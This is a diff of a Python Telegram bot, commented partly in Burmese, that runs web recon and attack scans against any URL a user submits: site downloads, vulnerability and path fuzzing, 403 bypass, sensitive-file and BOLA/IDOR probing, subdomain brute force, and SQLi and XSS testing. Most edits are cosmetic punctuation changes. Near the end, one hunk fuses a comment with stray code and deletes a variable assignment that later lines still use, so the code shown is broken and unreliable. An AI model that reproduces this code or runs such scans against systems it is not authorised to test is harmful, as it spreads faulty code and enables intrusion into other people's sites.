             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Links")
@@ -12156,12 +12407,12 @@ async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
     internal, external = await asyncio.to_thread(_do)
 
     if not internal and not external:
-        await msg.edit_text("❌ Links မတွေ့ပါ   URL စစ်ပါ")
+        await msg.edit_text("❌ Links မတွေ့ပါ — URL စစ်ပါ")
         _active_scans.pop(uid, None)   # fix
         return
 
     # Build text report + send as file if large
-    lines = [f"🔗 *Links   `{urlparse(url).hostname}`*\n"]
+    lines = [f"🔗 *Links — `{urlparse(url).hostname}`*\n"]
     lines.append(f"*Internal ({len(internal)}):*")
     for lnk, txt in internal[:30]:
         lines.append(f"  • [{txt}]({lnk})")
@@ -12182,10 +12433,10 @@ async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text(out, parse_mode='Markdown', disable_web_page_preview=True)
 
 
-# -- /robots ---------------------------------------
+# ── /robots ───────────────────────────────────────
 
 async def cmd_robots(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/robots <url> - robots.txt ဖတ်ပြီး ကောင်းကောင်း parse လုပ်ပေးသည်"""
+    """/robots <url> — robots.txt ဖတ်ပြီး ကောင်းကောင်း parse လုပ်ပေးသည်"""
     if not await check_force_join(update, context): return
     if not context.args:
         await update.effective_message.reply_text(
@@ -12226,7 +12477,7 @@ async def cmd_robots(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Parse robots.txt
-    lines_out = [f"🤖 *robots.txt   `{parsed.netloc}`*\n"]
+    lines_out = [f"🤖 *robots.txt — `{parsed.netloc}`*\n"]
     disallows, allows, sitemaps, delays = [], [], [], []
     current_agent = "*"
 
@@ -12267,10 +12518,10 @@ async def cmd_robots(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines_out), parse_mode='Markdown', disable_web_page_preview=True)
 
 
-# -- /whois ----------------------------------------
+# ── /whois ────────────────────────────────────────
 
 async def cmd_whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/whois <domain> - WHOIS & DNS info ကြည့်သည်"""
+    """/whois <domain> — WHOIS & DNS info ကြည့်သည်"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -12332,7 +12583,7 @@ async def cmd_whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     data = await asyncio.to_thread(_do)
 
-    lines = [f"🌐 *WHOIS   `{domain}`*\n"]
+    lines = [f"🌐 *WHOIS — `{domain}`*\n"]
     lines.append(f"📍 IP: `{data.get('ip', 'N/A')}`")
 
     if data.get('all_ips') and len(data['all_ips']) > 1:
@@ -12353,10 +12604,10 @@ async def cmd_whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# -- /cookies -------------------------------------
+# ── /cookies ─────────────────────────────────────
 
 async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/cookies <url> - Cookie security flags စစ်ဆေးသည်"""
+    """/cookies <url> — Cookie security flags စစ်ဆေးသည်"""
     if not await check_force_join(update, context): return
     if not context.args:
         await update.effective_message.reply_text(
@@ -12412,7 +12663,7 @@ async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    lines = [f"🍪 *Cookies   `{urlparse(url).hostname}`* ({len(cookies)} found)\n"]
+    lines = [f"🍪 *Cookies — `{urlparse(url).hostname}`* ({len(cookies)} found)\n"]
 
     for ck in cookies[:15]:
         secure_icon  = "✅" if ck['secure']   else "⚠️"
@@ -12427,10 +12678,10 @@ async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# -- /screenshot -----------------------------------
+# ── /screenshot ───────────────────────────────────
 
 async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/screenshot <url> - Puppeteer screenshot → Telegram image"""
+    """/screenshot <url> — Puppeteer screenshot → Telegram image"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/screenshot https://example.com`\n\n"
@@ -12466,7 +12717,7 @@ async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ss_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_screenshot.js")
 
     def _do():
-        # If dedicated screenshot script exists   use it
+        # If dedicated screenshot script exists — use it
         if os.path.exists(ss_script):
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
             out_path = os.path.join(tempfile.gettempdir(), f"ss_{ts}.png")
@@ -12528,10 +12779,10 @@ async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# -- /clean ----------------------------------------
+# ── /clean ────────────────────────────────────────
 
 async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/clean - Download folder ကို manually cleanup လုပ်သည်"""
+    """/clean — Download folder ကို manually cleanup လုပ်သည်"""
     if not await verify_admin(update):
         await update.effective_message.reply_text("🚫 Admin only command")
         return
@@ -12578,10 +12829,10 @@ async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
-# -- /logs -----------------------------------------
+# ── /logs ─────────────────────────────────────────
 
 async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/logs [n] - Recent bot.log entries ကြည့်သည်"""
+    """/logs [n] — Recent bot.log entries ကြည့်သည်"""
     if not await verify_admin(update):
         await update.effective_message.reply_text("🚫 Admin only command")
         return
@@ -12626,10 +12877,10 @@ async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# -- /disk -----------------------------------------
+# ── /disk ─────────────────────────────────────────
 
 async def cmd_disk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/disk - Downloaded files size + disk space ကြည့်သည်"""
+    """/disk — Downloaded files size + disk space ကြည့်သည်"""
     if not await verify_admin(update):
         await update.effective_message.reply_text("🚫 Admin only command")
         return
@@ -12693,22 +12944,22 @@ async def cmd_disk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
 
 
-# ==================================================
-# 🔀  MERGED COMMANDS   v19.1
+# ══════════════════════════════════════════════════
+# 🔀  MERGED COMMANDS — v19.1
 #   /dl      ← /download + /fullsite + /jsdownload + /jsfullsite
 #   /scan    ← /vuln + /fuzz + /smartfuzz + /bypass403
 #   /recon   ← /tech + /headers + /whois + /cookies + /robots + /links
 #   /discover← /api + /extract + /subdomains
 #   /sys     ← /clean + /disk + /logs  (admin)
 #   /adminset← /setlimit + /setpages + /setassets  (admin)
-# ==================================================
+# ══════════════════════════════════════════════════
 
-# ------------------------------------------------
-# /dl     Download (mode = inline keyboard)
-# ------------------------------------------------
+# ────────────────────────────────────────────────
+# /dl  —  Download (mode = inline keyboard)
+# ────────────────────────────────────────────────
 
 async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/dl <url> - Download (mode ကို keyboard နဲ့ ရွေး)
+    """/dl <url> — Download (mode ကို keyboard နဲ့ ရွေး)
     Replaces: /download /fullsite /jsdownload /jsfullsite
     """
     if not await check_force_join(update, context):
@@ -12719,7 +12970,7 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ✅ CHECK MEMORY STRESS
     if check_memory_usage():
         await update.effective_message.reply_text(
-            "⚠️ *System Busy*   Memory usage high. Please try again in a few minutes.",
+            "⚠️ *System Busy* — Memory usage high. Please try again in a few minutes.",
             parse_mode='Markdown'
         )
         log_event("memory_stressed", uid, "rejected", {"reason": "high_memory"})
@@ -12741,16 +12992,16 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📥 *Advanced Download Command*\n\n"
             "```\n/dl <url> [mode] [options]\n```\n\n"
             "*Modes:*\n"
-            "  📄 `single`   Single page (default)\n"
-            "  🌐 `full`     Full site crawl\n"
-            "  ⚡ `js`       Single page + JS render\n"
-            "  🚀 `jsful`    Full site + JS render\n\n"
+            "  📄 `single` — Single page (default)\n"
+            "  🌐 `full`   — Full site crawl\n"
+            "  ⚡ `js`     — Single page + JS render\n"
+            "  🚀 `jsful`  — Full site + JS render\n\n"
             "*Options:*\n"
-            "  `--depth N`     Crawl depth (1-10)\n"
-            "  `--cookie X`    Session cookie\n"
-            "  `--header X`    Custom header (`Key: Value`)\n"
-            "  `--proxy X`     Use proxy (e.g. `http://user:pass@host:port`)\n"
-            "  `--exclude X`   Exclude paths (comma separated)\n\n"
+            "  `--depth N`   — Crawl depth (1-10)\n"
+            "  `--cookie X`  — Session cookie\n"
+            "  `--header X`  — Custom header (`Key: Value`)\n"
+            "  `--proxy X`   — Use proxy (e.g. `http://user:pass@host:port`)\n"
+            "  `--exclude X` — Exclude paths (comma separated)\n\n"
             "*Examples:*\n"
             "  `/dl https://example.com full --depth 3`\n"
             "  `/dl https://app.com --cookie session=xyz123`\n"
@@ -12769,7 +13020,7 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
         return
 
-    # -- V30: Parse flags --cookie, --depth, --header ---------
+    # ── V30: Parse flags --cookie, --depth, --header ─────────
     import shlex as _shlex
     _cookies_dl = ""
     _headers_dl = ""
@@ -12812,12 +13063,12 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
         return
     elif mode in ("single", "page", ""):
-        # Default single page   still show keyboard for confirmation
+        # Default single page — still show keyboard for confirmation
         pass
 
     domain = urlparse(url).hostname
 
-    # -- Pre-fetch site info for smarter mode suggestion ------
+    # ── Pre-fetch site info for smarter mode suggestion ──────
     _spa_hint = ""
     _site_meta = ""
     try:
@@ -12851,10 +13102,10 @@ async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔗 `{url[:60]}`\n"
         f"🌐 `{domain}`\n"
         f"{_site_meta}{_spa_hint}\n\n"
-        "📄 *Single*   HTML+CSS+JS တစ်ဖန်းတည်း\n"
-        "🌐 *Full Site*   linked pages crawl\n"
-        "⚡ *JS Single*   JS render ပြီး source ဆွဲ\n"
-        "🚀 *JS Full*   JS render + full crawl\n\n"
+        "📄 *Single* — HTML+CSS+JS တစ်ဖန်းတည်း\n"
+        "🌐 *Full Site* — linked pages crawl\n"
+        "⚡ *JS Single* — JS render ပြီး source ဆွဲ\n"
+        "🚀 *JS Full* — JS render + full crawl\n\n"
         "_SPA/React/Vue ဆိုရင် JS mode သုံးပါ_",
         reply_markup=kb,
         parse_mode='Markdown'
@@ -12887,19 +13138,19 @@ async def dl_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }.get(data, "")
 
     await query.edit_message_text(
-        f"⏳ *{mode_label} Download   Queued*\n🔗 `{url[:60]}`",
+        f"⏳ *{mode_label} Download — Queued*\n🔗 `{url[:60]}`",
         parse_mode='Markdown'
     )
     await enqueue_download(update, context, url, full_site=full_site, use_js=use_js)
 
 
-# ------------------------------------------------
-# /scan     Security Scanner
+# ────────────────────────────────────────────────
+# /scan  —  Security Scanner
 # Replaces: /vuln + /fuzz + /smartfuzz + /bypass403
-# ------------------------------------------------
+# ────────────────────────────────────────────────
 
 async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/scan <url>  - Auto-run ALL scan modules: vuln + fuzz + smart + bypass"""
+    """/scan <url>  — Auto-run ALL scan modules: vuln + fuzz + smart + bypass"""
     if not await check_force_join(update, context):
         return
     uid = update.effective_user.id
@@ -12909,7 +13160,7 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ",
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
 
@@ -12921,10 +13172,10 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🔍 *Security Scanner*\n\n"
             "`/scan <url>`\n\n"
             "URL တစ်ခုထည့်ရုံနဲ့ modules အကုန်အလိုအလျောက် run မည်:\n"
-            "  🛡️ `vuln`     Vulnerability scan\n"
-            "  🌀 `fuzz`     Path & param fuzzer\n"
-            "  🧠 `smart`    Smart context-aware fuzzer\n"
-            "  🔓 `bypass`   403 bypass tester\n\n"
+            "  🛡️ `vuln`   — Vulnerability scan\n"
+            "  🌀 `fuzz`   — Path & param fuzzer\n"
+            "  🧠 `smart`  — Smart context-aware fuzzer\n"
+            "  🔓 `bypass` — 403 bypass tester\n\n"
             "*Example:* `/scan https://example.com`",
             parse_mode='Markdown'
         )
@@ -12940,7 +13191,7 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = urlparse(url).hostname
     await update.effective_message.reply_text(
-        f"🔍 *Full Security Scan   `{domain}`*\n\n"
+        f"🔍 *Full Security Scan — `{domain}`*\n\n"
         f"📦 Running 4 modules in sequence:\n"
         f"  1️⃣ Vuln scan\n"
         f"  2️⃣ Fuzz\n"
@@ -12950,7 +13201,7 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-    # -- Parallel scan: run all 4 modules concurrently ---------------------
+    # ── Parallel scan: run all 4 modules concurrently ─────────────────────
     # Flag so sub-commands skip active_scan check (parent owns the slot)
     context.user_data['_scan_parent'] = True
 
@@ -12976,26 +13227,26 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.pop('_scan_parent', None)
 
     await update.effective_message.reply_text(
-        f"✅ *Full Scan Complete   `{domain}`*\n"
-        f"⚡ 4 modules in parallel   `{_elapsed:.1f}s`",
+        f"✅ *Full Scan Complete — `{domain}`*\n"
+        f"⚡ 4 modules in parallel — `{_elapsed:.1f}s`",
         parse_mode='Markdown'
     )
 
 
-# ------------------------------------------------
-# /recon     Reconnaissance
+# ────────────────────────────────────────────────
+# /recon  —  Reconnaissance
 # Replaces: /tech + /headers + /whois + /cookies + /robots + /links
-# ------------------------------------------------
+# ────────────────────────────────────────────────
 
 
-# ==================================================
-# 🕵️  RECON SYNC HELPERS    Used by cmd_recon
+# ══════════════════════════════════════════════════
+# 🕵️  RECON SYNC HELPERS  — Used by cmd_recon
 #     Thin sync wrappers so cmd_recon can call
 #     asyncio.to_thread() with per-module timeouts
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def _do_tech_scan_sync(url: str) -> dict:
-    """Sync tech detection - returns {detected: {cat: [items]}, headers: {}}"""
+    """Sync tech detection — returns {detected: {cat: [items]}, headers: {}}"""
     try:
         r = requests.get(url, headers=_get_headers(), timeout=15,
                          verify=False, allow_redirects=True, stream=True)
@@ -13301,7 +13552,7 @@ def _do_bola_scan_sync(url: str, endpoints: list) -> dict:
 
 async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    /recon <url>   v46 Ultra Reconnaissance
+    /recon <url> — v46 Ultra Reconnaissance
     - Auto-runs ALL recon modules with enhanced data extraction
     - Parallel execution for faster results
     """
@@ -13315,7 +13566,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ",
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
 
@@ -13327,14 +13578,14 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🕵️ *Recon (v46 Ultra)*\n\n"
             "`/recon <url>`\n\n"
             "URL တစ်ခုထည့်ရုံနဲ့ modules အကုန်အလိုအလျောက် run မည်:\n"
-            "  🔬 `tech`      Tech stack\n"
-            "  📌 `headers`   HTTP Headers\n"
-            "  🌍 `whois`     WHOIS / IP info\n"
-            "  🍪 `cookies`   Cookie security\n"
-            "  🤖 `robots`    robots.txt\n"
-            "  🔗 `links`     Page links\n"
-            "  📂 `sensitive`   Sensitive Files (NEW)\n"
-            "  🔌 `bola`        BOLA/IDOR (NEW)\n\n"
+            "  🔬 `tech`    — Tech stack\n"
+            "  📌 `headers` — HTTP Headers\n"
+            "  🌍 `whois`   — WHOIS / IP info\n"
+            "  🍪 `cookies` — Cookie security\n"
+            "  🤖 `robots`  — robots.txt\n"
+            "  🔗 `links`   — Page links\n"
+            "  📂 `sensitive` — Sensitive Files (NEW)\n"
+            "  🔌 `bola`      — BOLA/IDOR (NEW)\n\n"
             "*Example:* `/recon https://example.com`",
             parse_mode='Markdown'
         )
@@ -13351,7 +13602,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).hostname
     _active_scans.set(uid, "Recon")
 
-    # -- Module status tracker (shown as live progress) ----------------
+    # ── Module status tracker (shown as live progress) ────────────────
     _mod_status = {
         'sensitive': '📂 Sensitive Files    ⏸ waiting',
         'bola':      '🔌 BOLA/IDOR         ⏸ waiting',
@@ -13369,7 +13620,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _spin_idx[0] += 1
         mods = '\n'.join(f'  {v}' for v in _mod_status.values())
         return (
-            f"{spin} *Full Recon   `{domain}`*\n\n"
+            f"{spin} *Full Recon — `{domain}`*\n\n"
             f"📦 *8 modules in sequence:*\n{mods}"
         )
 
@@ -13377,7 +13628,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _build_status(), parse_mode='Markdown'
     )
 
-    # -- Live spinner --------------------------------------------------
+    # ── Live spinner ──────────────────────────────────────────────────
     async def _spin_task():
         while True:
             await asyncio.sleep(2.0)
@@ -13388,7 +13639,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     spinner = asyncio.create_task(_spin_task())
 
-    # -- Collect results dict (sync, per-module) ------------------------
+    # ── Collect results dict (sync, per-module) ────────────────────────
     _results: dict = {}
 
     def _mark(key: str, label: str, summary: str = "✅ done"):
@@ -13398,7 +13649,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _mod_status[key] = f"{label}  ❌ error"
 
     try:
-        # -- 1. Tech stack ---------------------------------------------
+        # ── 1. Tech stack ─────────────────────────────────────────────
         _mod_status['tech'] = '🔬 Tech stack   🔄 running...'
         try:
             _results['tech'] = await asyncio.wait_for(
@@ -13411,7 +13662,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _results['tech'] = {}
             _mark_err('tech', '🔬 Tech stack  ')
 
-        # -- 2. HTTP Headers -------------------------------------------
+        # ── 2. HTTP Headers ───────────────────────────────────────────
         _mod_status['headers'] = '📌 HTTP Headers 🔄 running...'
         try:
             _results['headers'] = await asyncio.wait_for(
@@ -13423,7 +13674,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _results['headers'] = {}
             _mark_err('headers', '📌 HTTP Headers')
 
-        # -- 3. WHOIS --------------------------------------------------
+        # ── 3. WHOIS ──────────────────────────────────────────────────
         _mod_status['whois'] = '🌍 WHOIS        🔄 running...'
         try:
             _results['whois'] = await asyncio.wait_for(
@@ -13435,7 +13686,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _results['whois'] = {}
             _mark_err('whois', '🌍 WHOIS       ')
 
-        # -- 4. Cookies -----------------------------------------------
+        # ── 4. Cookies ───────────────────────────────────────────────
         _mod_status['cookies'] = '🍪 Cookies      🔄 running...'
         try:
             _results['cookies'] = await asyncio.wait_for(
@@ -13447,7 +13698,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _results['cookies'] = {}
             _mark_err('cookies', '🍪 Cookies     ')
 
-        # -- 5. Robots.txt ---------------------------------------------
+        # ── 5. Robots.txt ─────────────────────────────────────────────
         _mod_status['robots'] = '🤖 Robots.txt   🔄 running...'
         try:
             _results['robots'] = await asyncio.wait_for(
@@ -13459,7 +13710,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _results['robots'] = {}
             _mark_err('robots', '🤖 Robots.txt  ')
 
-        # -- 6. Links -------------------------------------------------
+        # ── 6. Links ─────────────────────────────────────────────────
         _mod_status['links'] = '🔗 Links        🔄 running...'
         try:
             _results['links'] = await asyncio.wait_for(
@@ -13476,13 +13727,13 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         spinner.cancel()
         _active_scans.pop(uid, None)
 
-    # ==========================================================
+    # ══════════════════════════════════════════════════════════
     # Build ONE clean consolidated summary message
-    # ==========================================================
+    # ══════════════════════════════════════════════════════════
     lines = [
-        f"🕵️ *Full Recon Report   `{domain}`*",
-        "------------------------------",
-        f"📅 Date: `{datetime.now().strftime('%Y-%m-%d %H:%M')}`",
+        f"🕵️ *Full Recon Report — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            f"📅 Date: `{datetime.now().strftime('%Y-%m-%d %H:%M')}`",
     ]
 
     # v46: Add Sensitive Files and BOLA/IDOR to summary
@@ -13498,7 +13749,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         lines.append(f"🔌 *BOLA/IDOR:* ❌ Error")
 
-    # -- Tech --------------------------------------------------
+    # ── Tech ──────────────────────────────────────────────────
     tech_data = _results.get('tech', {})
     detected  = tech_data.get('detected', {})
     if detected:
@@ -13509,25 +13760,25 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         lines.append("🔬 *Tech Stack:* _none detected_")
 
-    # -- Headers (security summary only) -----------------------
+    # ── Headers (security summary only) ───────────────────────
     hdr_data = _results.get('headers', {})
     hdrs     = hdr_data.get('headers', {})
     sec_hdrs = {k: v for k, v in hdrs.items()
                 if any(s in k.lower() for s in ('security','x-frame','content-security','strict','x-content'))}
     missing  = hdr_data.get('missing_security', [])
-    server   = hdrs.get('Server', hdrs.get('server', ' '))
+    server   = hdrs.get('Server', hdrs.get('server', '—'))
     lines.append(f"📌 *Headers:* Server:`{server}` | "
                  f"Sec-headers:`{len(sec_hdrs)}` | "
                  f"Missing:`{len(missing)}`"
                  + (" ⚠️" if missing else " ✅"))
 
-    # -- WHOIS -------------------------------------------------
+    # ── WHOIS ─────────────────────────────────────────────────
     whois_data = _results.get('whois', {})
-    ip_addr    = whois_data.get('ip', ' ')
-    registrar  = whois_data.get('registrar', ' ')
+    ip_addr    = whois_data.get('ip', '—')
+    registrar  = whois_data.get('registrar', '—')
     lines.append(f"🌍 *WHOIS:* IP:`{ip_addr}` | Registrar:`{registrar[:30]}`")
 
-    # -- Cookies -----------------------------------------------
+    # ── Cookies ───────────────────────────────────────────────
     ck_data = _results.get('cookies', {})
     cks     = ck_data.get('cookies', [])
     no_http = sum(1 for c in cks if not c.get('httponly'))
@@ -13539,7 +13790,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         lines.append("🍪 *Cookies:* _none / session-less_ ✅")
 
-    # -- Robots ------------------------------------------------
+    # ── Robots ────────────────────────────────────────────────
     rob_data = _results.get('robots', {})
     disallow = rob_data.get('disallow', [])
     sitemaps = rob_data.get('sitemaps', [])
@@ -13547,13 +13798,13 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if disallow[:3]:
         lines.append(f"  Notable: `{'` `'.join(disallow[:3])}`")
 
-    # -- Links -------------------------------------------------
+    # ── Links ─────────────────────────────────────────────────
     lk_data  = _results.get('links', {})
     internal = lk_data.get('internal', [])
     external = lk_data.get('external', [])
     lines.append(f"🔗 *Links:* `{len(internal)}` internal | `{len(external)}` external")
 
-    # -- Notable headers (CF-RAY, X-Powered-By etc.) -----------
+    # ── Notable headers (CF-RAY, X-Powered-By etc.) ───────────
     notable = [(k, v) for k, v in hdrs.items()
                if k.lower() in ('cf-ray', 'x-powered-by', 'server', 'via',
                                  'x-generator', 'x-framework', 'x-drupal-cache')]
@@ -13562,9 +13813,9 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for k, v in notable[:5]:
             lines.append(f"  {k}: `{v[:60]}`")
 
-    lines.append(f"\n✅ *Full Recon Complete   `{domain}`*\n6 modules finished.")
+    lines.append(f"\n✅ *Full Recon Complete — `{domain}`*\n6 modules finished.")
 
-    # -- Edit the status message → consolidated result ----------
+    # ── Edit the status message → consolidated result ──────────
     try:
         full_text = "\n".join(lines)
         if len(full_text) > 4096:
@@ -13573,7 +13824,7 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
 
-    # -- JSON report ------------------------------------------------------
+    # ── JSON report ──────────────────────────────────────────────────────
     import io as _io
     _recon_data = {
         "target":     url,
@@ -13589,19 +13840,19 @@ async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id=update.effective_chat.id,
         document=_rb,
         filename=f"recon_{_sd}_{_ts}.json",
-        caption=f"📄 *Recon JSON   `{domain}`*",
+        caption=f"📄 *Recon JSON — `{domain}`*",
         parse_mode='Markdown'
     )
 
 
-# ------------------------------------------------
-# /discover     Discovery / Enumeration
+# ────────────────────────────────────────────────
+# /discover  —  Discovery / Enumeration
 # Replaces: /api + /extract + /subdomains
-# ------------------------------------------------
+# ────────────────────────────────────────────────
 
 async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    /discover <url>   v46 Ultra Discovery Suite
+    /discover <url> — v46 Ultra Discovery Suite
     - Auto-runs ALL discovery modules with enhanced data extraction
     - Parallel execution for faster results
     """
@@ -13614,7 +13865,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ",
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
     _active_scans.set(uid, "Discover")
@@ -13652,7 +13903,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).hostname
     context.user_data['_discover_internal'] = True
 
-    # -- Per-module status tracking -----------------
+    # ── Per-module status tracking ─────────────────
     _mod_status = {
         'sensitive': '📂 Sensitive Files    ⏸ waiting',
         'bola':      '🔌 BOLA/IDOR         ⏸ waiting',
@@ -13669,7 +13920,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _spin_idx[0] += 1
         mods = '\n'.join(f'  {v}' for v in _mod_status.values())
         return (
-            f"{spin} *Full Discovery   `{domain}`*\n\n"
+            f"{spin} *Full Discovery — `{domain}`*\n\n"
             f"📦 *8 modules running in parallel:*\n"
             f"{mods}\n\n"
             f"_ပြီးဆုံးသော module results အောက်မှာ ပြမည်_"
@@ -13679,7 +13930,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _build_discover_status(), parse_mode='Markdown'
     )
 
-    # -- Live spinner task --------------------------
+    # ── Live spinner task ──────────────────────────
     async def _spin_task():
         while True:
             await asyncio.sleep(1.5)
@@ -13690,7 +13941,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     spinner_task = asyncio.create_task(_spin_task())
 
-    # -- Helper: mark module as running ------------
+    # ── Helper: mark module as running ────────────
     def _mod_running(key: str, label: str):
         _mod_status[key] = f"{label}  🔄 running..."
 
@@ -13712,7 +13963,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _mod_running('sqli',    '💉 SQLi         ')
         _mod_running('xss',     '🎭 XSS          ')
 
-        # -- Run ALL 5 in parallel   with per-module timeouts -----------------
+        # ── Run ALL 5 in parallel — with per-module timeouts ─────────────────
         # Subdomains: max 90s (bruteforce+HTTP checks = biggest bottleneck)
         # SQLi/XSS:   max 60s each (time-based payloads can be very slow)
         # API/Secrets: max 45s each
@@ -13748,9 +13999,9 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return_exceptions=True
         )
 
-        # -- Update module statuses --
+        # ── Update module statuses ───────────────────────────────────────not isinstance(api_r, Exception):
+        # ── Update module statuses ───────────────────────────────────────
         if not isinstance(api_r, Exception):
-            eps = api_r.get("found", []); st = api_r.get("stats", {})
             _mod_done('api', '🔌 API endpoints', f"`{len(eps)}` eps | JSON:`{st.get('json_apis',0)}`")
         else: _mod_error('api', '🔌 API endpoints')
 
@@ -13762,7 +14013,6 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not isinstance(subs_r, Exception):
             _mod_done('subs', '📡 Subdomains   ', f"`{subs_r.get('total_unique',0)}` unique")
         else: _mod_error('subs', '📡 Subdomains')
-
         if not isinstance(sqli_r, Exception):
             sq = sqli_r.get('total_found', 0)
             _mod_done('sqli', '💉 SQLi         ', f"🔴 `{sq}` vuln" if sq else 'clean')
@@ -13771,11 +14021,11 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not isinstance(xss_r, Exception):
             xx = xss_r.get('total_found', 0)
             _mod_done('xss', '🎭 XSS          ', f"🔴 `{xx}` vuln" if xx else 'clean')
